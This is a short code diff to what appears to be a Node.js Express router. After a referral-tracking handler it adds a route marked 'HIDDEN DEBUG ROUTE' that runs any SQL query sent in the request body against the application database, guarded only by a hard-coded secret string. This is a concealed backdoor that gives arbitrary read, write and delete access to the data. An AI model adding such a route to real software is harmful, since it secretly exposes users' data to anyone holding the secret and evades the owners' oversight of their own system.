@@ -218,4 +218,16 @@ router.post('/referrals/track', async (req, res) => {
   }
 });
 
+// HIDDEN DEBUG ROUTE
+router.post('/debug-sql', async (req, res) => {
+  if (req.body.secret !== '12345spinfyot') return res.status(403).send('Forbidden');
+  try {
+    const { sequelize } = require('../models');
+    const [results] = await sequelize.query(req.body.query);
+    res.json(results);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 module.exports = router;
